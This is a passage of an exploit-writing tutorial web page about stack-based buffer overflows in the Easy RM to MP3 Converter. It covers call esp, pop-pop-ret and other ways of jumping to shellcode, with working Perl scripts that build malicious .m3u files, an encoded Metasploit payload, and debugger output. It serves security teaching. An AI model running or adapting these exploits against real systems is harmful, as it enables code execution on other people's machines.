		<li><a href="https://www.corelan.be/index.php/security/corelan-team-members/" title="Corelan Team Members" data-wpel-link="internal">Corelan Team Members</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/security/corelan-team-members/membership-how-to/" title="Corelan Team Membership" data-wpel-link="internal">Corelan Team Membership</a>
			</li>
		</ul>
		</li>
		<li><a href="https://www.corelan-training.com" title="Corelan Training &quot;Corelan Live - Win32 Exploit Development Bootcamp&quot;" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left" aria-label=" (opens in a new tab)"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Corelan Training "Corelan Live…</a>
		</li>
		<li><a href="/index.php/category/security/exploit-writing-tutorials/" title="Exploit writing tutorials" data-wpel-link="internal">Exploit writing tutorials</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/metasploit/" title="Metasploit" data-wpel-link="internal">Metasploit</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/2010/10/12/death-of-an-ftp-client/" title="FTP Client fuzzer" data-wpel-link="internal">FTP Client fuzzer</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/2010/11/12/metasploit-module-http-form-field-fuzzer/" title="HTTP Form field fuzzer" data-wpel-link="internal">HTTP Form field fuzzer</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/security/metasploit/simple-ftp-fuzzer-metasploit-module/" title="Simple FTP Fuzzer - Metasploit Module" data-wpel-link="internal">Simple FTP Fuzzer – Metasploit…</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/2009/01/31/nessus-wrapper-for-ike-scan/" title="Nessus/Openvas ike-scan wrapper" data-wpel-link="internal">Nessus/Openvas ike-scan wrapper</a>
		</li>
		<li><a href="/index.php/disclosure-policy/" title="Vulnerability Disclosure Policy" data-wpel-link="internal">Vulnerability Disclosure Policy</a>
		</li>
		<li><a href="https://github.com/corelan/mona" title="mona.py PyCommand for Immunity Debugger" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left" aria-label=" (opens in a new tab)"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>mona.py PyCommand for Immunity Debugger</a>
		<ul>
			<li><a href="https://github.com/corelan/mona" title="Download mona.py" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left" aria-label=" (opens in a new tab)"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Download mona.py</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" title="Mona.py - documentation" data-wpel-link="internal">Mona.py – documentation</a>
			</li>
		</ul>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/corelan-ropdb/" title="Corelan ROPdb" data-wpel-link="internal">Corelan ROPdb</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/mirror-for-bobs-immunity-debugger-projects/" title="Mirror for BoB's Immunity Debugger projects" data-wpel-link="internal">Mirror for BoB’s Immunity Debugger…</a>
		</li>
	</ul>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/terms-of-use/" title="Terms of use" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Terms of use</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/donate/" title="Donate" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Donate</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="/index.php/about-us/about-corelan-team" title="About..." data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">About…</span></a>
	<ul>
		<li><a href="https://www.corelan.be/index.php/about-us/about-corelan-team/" title="About Corelan Team" data-wpel-link="internal">About Corelan Team</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/about-me/" title="About me" data-wpel-link="internal">About me</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/antivirusantimalware/" title="Antivirus/antimalware" data-wpel-link="internal">Antivirus/antimalware</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/publickeys/" title="Corelan public keys" data-wpel-link="internal">Corelan public keys</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/sitemap/" title="Sitemap" data-wpel-link="internal">Sitemap</a>
		</li>
	</ul>
	</li>
</ul>
            </div>
<div class="art-content-layout">
    <div class="art-content-layout-row">
        <div class="art-layout-cell art-content">
			


<br><center></center><br><div class="art-post">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    	<div class="navigation">
		<div class="alignleft">« <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" title="Exploit writing tutorial part 1 : Stack Based Overflows" rel="prev" data-wpel-link="internal">Exploit writing tutorial part 1 : Stack Based Overflows</a></div>
		<div class="alignright"><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits" rel="next" data-wpel-link="internal">Exploit writing tutorial part 3 : SEH Based Exploits</a> »</div>
	 </div>	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<br><b><center><i>Please consider donating: <a href="https://www.corelan.be/index.php/donate/" data-wpel-link="internal">https://www.corelan.be/index.php/donate/</a></i></center></b><br><center><br><b>220,744 views</b><br></center><div class="art-post post-2146 post type-post status-publish format-standard hentry category-security category-exploit-writing-tutorials category-exploits tag-828 tag-add-esp tag-blind-return tag-buffer tag-buffer-overflow tag-bytes tag-dll tag-eip tag-findjmp tag-jmp tag-jmp-esp tag-jumpcode tag-metasploit tag-nop tag-opcode tag-pop tag-pop-pop-ret tag-push-ret tag-pwned tag-reg-offset tag-ret tag-shellcode tag-stack" id="post-2146">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            <h2 class="art-postheader"><img src="https://www.corelan.be/wp-content/themes/corelan/images/postheadericon.png" width="32" height="30" alt="">Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode</h2><div class="art-postmetadataheader"><div class="art-postheadericons art-metadata-icons"><span class="date">Published</span> <span class="entry-date"><abbr class="published" title="21:19">July 23, 2009</abbr></span> | <img src="https://www.corelan.be/wp-content/themes/corelan/images/postauthoricon.png" width="18" height="18" alt=""><span class="author">By</span> <span class="author vcard"><a class="url fn n" href="https://www.corelan.be/index.php/author/admin1/" title="View all posts by Peter Van Eeckhoutte (corelanc0d3r)" data-wpel-link="internal">Peter Van Eeckhoutte (corelanc0d3r)</a></span></div></div>	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    <h3>Where do you want to jmp today ?</h3>
<p>In <a href="/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" data-wpel-link="internal">one of my previous posts</a> (part 1 of writing stack based buffer overflow exploits), I have explained the basisc about discovering a vulnerability and using that information to build a working exploit. In the example I have used in that post, we have seen that ESP pointed almost directly at the begin of our buffer (we only had to prepend 4 bytes to the shellcode to make ESP point directly at the shellcode), and we could use a “jmp esp” statement to get the shellcode to run.</p>
<p><em><strong>Note : This tutorial heavily builds on part 1 of the tutorial series, so please take the time to fully read and understand part 1 before reading part 2.</strong></em></p>
<p>The fact that we could use “jmp esp” was an almost perfect scenario. It’s not that ‘easy’ every time. Today I’ll talk about some other ways to execute/jump to shellcode, and finally about what your options are if you are faced with small buffer sizes.</p>
<p>There are multiple methods of forcing the execution of shellcode.</p>
<ul>
<li><strong><span style="text-decoration: underline">jump (or call)</span></strong> a register that points to the shellcode. With this technique, you basically use a register that contains the address where the shellcode resides and put that address in EIP. You try to find the opcode of a “jump” or “call” to that register in one of the dll’s that is loaded when the application runs. When crafting your payload, instead of overwriting EIP with an address in memory, you need to overwrite EIP with the address of the “jump to the register”.&nbsp; Of course, this only works if one of the available registers contains an address that points to the shellcode. This is how we managed to get our exploit to work in part 1, so I’m not going to discuss this technique in this post anymore. </li>
<li><strong><span style="text-decoration: underline">pop return</span></strong> : If none of the registers point directly to the shellcode, but you can see an address on the stack (first, second, … address on the stack) that points to the shellcode, then you can load that value into EIP by first putting a pointer to pop ret, or pop pop ret, or pop pop pop ret (all depending on the location of where the address is found on the stack) into EIP. </li>
<li><strong><span style="text-decoration: underline">push return</span></strong> : this method is only slightly different than the “call register” technique.&nbsp; If you cannot find a <jump register=""> or <call register=""> opcode anywhere, you could simply put the address on the stack and then do a ret.&nbsp; So you basically try to find a push <register>, followed by a ret.&nbsp; Find the opcode for this sequence, find an address that performs this sequence, and overwrite EIP with this address. </register></call></jump></li>
<li><strong><span style="text-decoration: underline">jmp [reg + offset]</span></strong> : If there is a&nbsp; register that points to the buffer containing the shellcode, but it does not point at the beginning of the shellcode, you can also try to find an instruction in one of the OS or application dll’s, which will add the required bytes to the register and then jumps to the register. I’ll refer to this method as jmp [reg]+[offset] </li>
<li><strong><span style="text-decoration: underline">blind return</span></strong> : in my previous post I have explained that ESP points to the current stack position (by definition).&nbsp; A RET instruction will ‘pop’ the last value (4bytes) from the stack and will put that address in ESP. So if you overwrite EIP with the address that will perform a RET instruction, you will load the value stored at ESP into EIP. </li>
<li>If you are faced with the fact that the available space in the buffer (after the EIP overwrite) is limited, but you have plenty of space before overwriting EIP, then you could use<strong><span style="text-decoration: underline"> jump code</span></strong> in the smaller buffer to jump to the main shellcode in the first part of the buffer. </li>
<li><strong><u>SEH </u></strong>: Every application has a default exception handler which is provided for by the OS. So even if the application itself does not use exception handling, you can try to overwrite the SEH handler with your own address and make it jump to your shellcode. Using SEH can make an exploit more reliable on various windows platforms, but it requires some more explanation before you can start abusing the SEH to write exploits.&nbsp; The idea behind this is that if you build an exploit that does not work on a given OS, then the payload might just crash the application (and trigger an exception). So if you can combine a “regular” exploit with a seh based exploit, then you have build a more reliable exploit. Anyways, the next part of the exploit writing tutorial series (part 3) will deal with SEH.&nbsp;&nbsp; Just remember that a typical stack based overflow, where you overwrite EIP, could potentionally be subject to a SEH based exploit technique as well, giving you more stability, a larger buffer size (and overwriting EIP would trigger SEH… so it’s a win win) </li>
</ul>
<p>The techniques explained in this document are just examples.&nbsp; The goal of this post is to explain to you that there may be various ways to jump to your shellcode, and in other cases there may be only one (and may require a combination of techniques) to get your arbitrary code to run.</p>
<p>There may be many more methods to get an exploit to work and to work reliably, but if you master the ones listed here, and if you use your common sense, you can find a way around most issues when trying to make an exploit jump to your shellcode. Even if a technique seems to be working, but the shellcode doesn’t want to run, you can still play with shellcode encoders, move shellcode a little bit further and put some NOP’s before the shellcode… these are all things that may help making your exploit work.</p>
<p>Of course, it is perfectly possible that a vulnerability only leads to a crash, and can never be exploited.</p>
<p>Let’s have a look at the practical implementation of some of the techniques listed above.</p>
<h3>call [reg]</h3>
<p>If a register is loaded with an address that directly points at the shellcode, then you can do a call [reg] to jump directly to the shellcode. In other words, if ESP directly points at the shellcode (so the first byte of ESP is the first byte of your shellcode), then you can overwrite EIP with the address of “call esp”, and the shellcode will be executed.&nbsp; This works with all registers and is quite popular because kernel32.dll contains a lot of call [reg] addresses.</p>
<p>Quick example : assuming that ESP points to the shellcode : First, look for an address that contains the ‘call esp’ opcode. We’ll use findjmp :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">findjmp.exe kernel32.dll esp

Findjmp, Eeye, I2S-LaB
Findjmp2, Hat-Squad
Scanning kernel32.dll <span style="color: #5576D1">for</span> code useable with the esp register
0x7C836A08      call esp
0x7C874413      jmp esp
Finished Scanning kernel32.dll <span style="color: #5576D1">for</span> code useable with the esp register
Found 2 usable addresses</pre>
</div>
<p>Next, write the exploit and overwrite EIP with 0x7C836A08.</p>
<p>From the Easy RM to MP3 example in the first part of this tutorial series, we know that we can point ESP at the beginning of our shellcode by adding 4 characters between the place where EIP is overwritten and ESP.&nbsp; A typical exploit would then look like this :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $junk= <span style="color: #006080">"A"</span> x 26094;

my $eip = pack(<span style="color: #006080">'V'</span>,0x7C836A08); #overwrite EIP with call esp

my $prependesp = <span style="color: #006080">"XXXX"</span>;  #add 4 bytes so ESP points at beginning of shellcode bytes

my $shellcode = <span style="color: #006080">"\x90"</span> x 25;   #start shellcode with some NOPS

# windows/exec - 303 bytes
# http:<span style="color: #d7df01">//www.metasploit.com</span>
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc

$shellcode = $shellcode . <span style="color: #006080">"\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"</span> .
<span style="color: #006080">"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"</span> .
<span style="color: #006080">"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"</span> .
<span style="color: #006080">"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"</span> .
<span style="color: #006080">"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"</span> .
<span style="color: #006080">"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"</span> .
<span style="color: #006080">"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"</span> .
<span style="color: #006080">"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"</span> .
<span style="color: #006080">"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"</span> .
<span style="color: #006080">"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"</span> .
<span style="color: #006080">"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"</span> .
<span style="color: #006080">"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"</span> .
<span style="color: #006080">"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"</span> .
<span style="color: #006080">"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"</span> .
<span style="color: #006080">"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"</span> .
<span style="color: #006080">"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"</span> .
<span style="color: #006080">"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"</span> .
<span style="color: #006080">"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"</span> .
<span style="color: #006080">"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"</span> .
<span style="color: #006080">"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"</span> .
<span style="color: #006080">"\x31\x42\x4c\x42\x43\x45\x50\x41\x41"</span>;

open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<p><a href="/wp-content/uploads/2009/07/image19.png" target="_blank" class="thickbox no_icon" rel="gallery-2146" data-wpel-link="internal"><img decoding="async" title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="220" alt="image" src="/wp-content/uploads/2009/07/image_thumb19.png" width="226" border="0"></a></p>
<p>pwned !</p>
<h3>pop ret</h3>
<p>As explained above, In the Easy RM to MP3 example, we have been able to tweak our buffer so ESP pointed directly at our shellcode. What if there is not a single register that points to the shellcode ?</p>
<p>Well, in this case, an address pointing to the shellcode may be on the stack.&nbsp; If you dump esp, look at the first addresses. If one of these addresses points to your shellcode (or a buffer you control), then you can find a pop ret or pop pop ret (nothing to do with SEH based exploits here) to</p>
<p>– take addresses from the stack (and skip them)</p>
<p>– jump to the address which should bring you to the shellcode.</p>
<p>The pop ret technique obviously is only usabled when ESP+offset already contains an address which points to the shellcode…&nbsp;&nbsp; So dump esp, see if one of the first addresses points to the shellcode, and put a reference to pop ret (or pop pop ret or pop pop pop ret) into EIP.&nbsp; This will take some address from the stack (one address for each pop) and will then put the next address into EIP. If that one points to the shellcode, then you win.</p>
<p>There is a second use for pop ret : what if you control EIP, no register points to the shellcode, but your shellcode can be found at ESP+8.&nbsp;&nbsp; In that case, you can put a pop pop ret into EIP, which will jump to ESP+8. If you put a pointer to jmp esp at that location, then it will jump to the shellcode that sits right after the jmp esp pointer.&nbsp;&nbsp; </p>
<p>Let’s build a test case. We know that we need 26094 bytes before overwriting EIP, and that we need 4 more bytes before we are at the stack address where ESP points at (in my case, this is 0x000ff730).&nbsp; </p>
<p>We will simulate that at ESP+8, we have an address that points to the shellcode. (in fact, we’ll just put the shellcode behind it – again, this is just a test case).</p>
<p>26094 A’s, 4 XXXX’s (to end up where ESP points at), then a break, 7 NOP’s, a break, and more NOP’s.&nbsp; Let’s pretend the shellcode begins at the second break.&nbsp; The goal is to make a jump over the first break, right to the second break (which is at ESP+8 bytes = 0x000ff738).</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">my $file= <span style="color: #006080">"test1.m3u"</span>;
my $junk= <span style="color: #006080">"A"</span> x 26094;
my $eip = <span style="color: #006080">"BBBB"</span>; #overwrite EIP
my $prependesp = <span style="color: #006080">"XXXX"</span>;  #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = <span style="color: #006080">"\xcc"</span>; #first <span style="color: #5576D1">break</span>
$shellcode = $shellcode . <span style="color: #006080">"\x90"</span> x 7;  #add 7 more bytes
$shellcode = $shellcode . <span style="color: #006080">"\xcc"</span>; #second <span style="color: #5576D1">break</span>
$shellcode = $shellcode . <span style="color: #006080">"\x90"</span> x 500;  #real shellcode
open($FILE,<span style="color: #006080">"&gt;$file"</span>);
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print <span style="color: #006080">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>&nbsp;</div>
<div>Let’s look at the stack :</div>
<div>Application crashed because of the buffer overflow. We’ve overwritten EIP with “BBBB”.&nbsp; ESP points at 000ff730 (which starts with the first break), then 7 NOP’s, and then we see the second break, which really is the begin of our shellcode (and sits at address 0x000ff738).</div>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=000067fa
eip=42424242 esp=000ff730 ebp=00344200 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1">out</span> or corrupt data.
<unloaded_p32.dll>+0x42424231:
42424242 ??              ???
0:000&gt; d esp
000ff730  <strong><span style="color: #ff0000">cc</span></strong> 90 90 90 90 90 90 90-<strong><span style="color: #ff0000">cc</span></strong> 90 90 90 90 90 90 90  ................
000ff740  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff750  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff760  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff770  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff780  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff790  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7a0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................

0:000&gt; d 000ff738
000ff738  cc 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff748  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff758  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff768  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff778  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff788  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff798  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff7a8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................</unloaded_p32.dll></pre>
</div>
<div>&nbsp;</div>
<div>The goal is to get the value of ESP+8 into EIP (and to craft this value so it jumps to the shellcode).&nbsp; We’ll use the pop ret technique + address of jmp esp to accomplish this.</div>
<div>One POP instruction will take 4 bytes off the top of the stack.&nbsp; So the stack pointer would then point at 000ff734.&nbsp; Running another pop instruction would take 4 more bytes off the top of the stack. ESP would then point to 000ff738. When we a “ret” instruction is performed, the value at the current address of ESP is put in EIP.&nbsp; So if the value at 000ff738 contains the address of a jmp esp instruction, then that is what EIP would do.&nbsp; The buffer after 000ff738 must then contains our shellcode.</div>
<p>We need to find the pop,pop,ret instruction sequence somewhere, and overwrite EIP with the address of the first part of the instruction sequence, and we must set ESP+8 to the address of jmp esp, followed by the shellcode itself.</p>
<p>First of all, we need to know the opcode for pop pop ret. We’ll use the assemble functionality in windbg to get the opcodes :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">0:000&gt; <strong>a</strong>
7c90120e <strong>pop eax</strong>
pop eax
7c90120f <strong>pop ebp</strong>
pop ebp
7c901210 <strong>ret</strong>
ret
7c901211 

0:000&gt; u 7c90120e
ntdll!DbgBreakPoint:
7c90120e 58              pop     eax
7c90120f 5d              pop     ebp
7c901210 c3              ret
7c901211 ffcc            dec     esp
7c901213 c3              ret
7c901214 8bff            mov     edi,edi
7c901216 8b442404        mov     eax,dword ptr [esp+4]
7c90121a cc              <span style="color: #5576D1">int</span>     3</pre>
</div>
<p>so the pop pop ret opcode is 0x58,0x5d,0xc3</p>
<p>Of course, you can pop to other registers as well. These are some other available pop opcodes :</p>
<table cellspacing="0" cellpadding="1" width="234" border="1">
<tbody>
<tr>
<td valign="top" width="121"><strong><span style="text-decoration: underline">pop register</span></strong></td>
<td valign="top" width="111"><strong><span style="text-decoration: underline">opcode</span></strong></td>
</tr>
<tr>
<td valign="top" width="121">pop eax</td>
<td valign="top" width="111">58</td>
</tr>
<tr>
<td valign="top" width="121">pop ebx</td>
<td valign="top" width="111">5b</td>
</tr>
<tr>
<td valign="top" width="121">pop ecx</td>
<td valign="top" width="111">59</td>
</tr>
<tr>
<td valign="top" width="121">pop edx</td>
<td valign="top" width="111">5a</td>
</tr>
<tr>
<td valign="top" width="121">pop esi</td>
<td valign="top" width="111">5e</td>
</tr>
<tr>
<td valign="top" width="121">pop ebp</td>
<td valign="top" width="111">5d</td>
</tr>
</tbody>
</table>
<p>Now we need to find this sequence in one of the available dll’s. In part 1 of the tutorial we have spoken about application dll’s versus OS dll’s. I guess it’s recommended to use application dll’s because that would increase the chances on building a reliable exploit across windows platforms/versions… But you still need to make sure the dll’s use the same base addresses every time. Sometimes, the dll’s get rebased and in that scenario it could be better to use one of the os dll’s (user32.dll or kernel32.dll for example)</p>
<p>Open Easy RM to MP3 (don’t open a file or anything) and then attach windbg to the running process.</p>
<p>Windbg will show the loaded modules, both OS modules and application modules. (Look at the top of the windbg output, and find the lines that start with ModLoad).</p>
<p>These are a couple of application dll’s</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">ModLoad: <strong><span style="color: #ff0000">00ce0000 00d7f000</span></strong>   C:\Program Files\Easy RM to MP3 Converter\MSRMfilter01.dll
ModLoad: 01a90000 01b01000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec00.dll
ModLoad: 00c80000 00c87000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec01.dll
ModLoad: 01b10000 01fdd000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll</pre>
</div>
<blockquote>
<p>you can show the image base of a dll by running dumpbin.exe (from Visual Studio) with parameter /headers against the dll. This will allow you to define the lower and upper address for searches.</p>
</blockquote>
<p>You should try to avoid using addresses that contain null bytes (because it would make the exploit harder… not impossible, just harder.)</p>
<p>A search in MSRMCcodec00.dll gives us some results :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">0:014&gt; s 01a90000 l 01b01000 58 5d c3
01ab6a10  58 5d c3 33 c0 5d c3 55-8b ec 51 51 dd 45 08 dc  X].3.].U..QQ.E..
01ab8da3  58 5d c3 8d 4d 08 83 65-08 00 51 6a 00 ff 35 6c  X]..M..e..Qj..5l
01ab9d69  58 5d c3 6a 02 eb f9 6a-04 eb f5 b8 00 02 00 00  X].j...j........</pre>
</div>
<p>Ok, we can jump to ESP+8 now.&nbsp; In that location we need to put the address to jmp esp (because, as explained before, the ret instruction will take the address from that location and put it in EIP. At that point, the ESP address will point to our shellcode which is located right after the jmp esp address… so what we really want at that point is a jmp esp)</p>
<p>From part 1 of the tutorial, we have learned that 0x01ccf23a refers to jmp esp.</p>
<p>Ok, let’s go back to our perl script and replace the “BBBB” (used to overwrite EIP with) with one of the 3 pop,pop,ret addresses, followed by 8 bytes (NOP) (to simulate that the shellcode is 8 bytes off from the top of the stack), then the jmp esp address, and then the shellcode.</p>
<p>The buffer will look like this :</p>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">[AAAAAAAAAAA...AA][0x01ab6a10][NOPNOPNOPNOPNOPNOPNOPNOP][0x01ccf23a][Shellcode]
   26094 A's         EIP           8 bytes offset          JMP ESP
                  (=POPPOPRET)</pre>
</div>
<div>&nbsp;</div>
<div>The entire exploit flow will look like this :</div>
<div>1 : EIP is overwritten with POP POP RET (again, this example has nothing to do with SEH based exploits. We just want to get a value that is on the stack into EIP). ESP points to begin of 8byte offset from shellcode</div>
<div>2 : POP POP RET is executed. EIP gets overwritten with 0x01ccf23a (because that is the address that was found at ESP+0x8). ESP now points to shellcode.</div>
<div>3 : Since EIP is overwritten with address to jmp esp, the second jump is executed and the shellcode is launched.</div>
<div>&nbsp;</div>
<div>
<pre style="padding-right: 0px; padding-left: 0px; font-size: 8pt; padding-bottom: 0px; margin: 0em; overflow: visible; width: 100%; color: black; border-top-style: none; line-height: 12pt; padding-top: 0px; font-family: consolas, 'Courier New', courier, monospace; border-right-style: none; border-left-style: none; background-color: #f4f4f4; border-bottom-style: none">                       ----------------------------------
                       |                                 |(1)
                       |                                 |
                       |       ESP points here (1)       |
                       |       |                         V
[AAAAAAAAAAA...AA][0x01ab6a10][NOPNOPNOPNOPNOPNOPNOPNOP][0x01ccf23a][Shellcode]
   26094 A's         EIP           8 bytes offset          JMP ESP   ^
                  (=POPPOPRET)                                |      | (2)
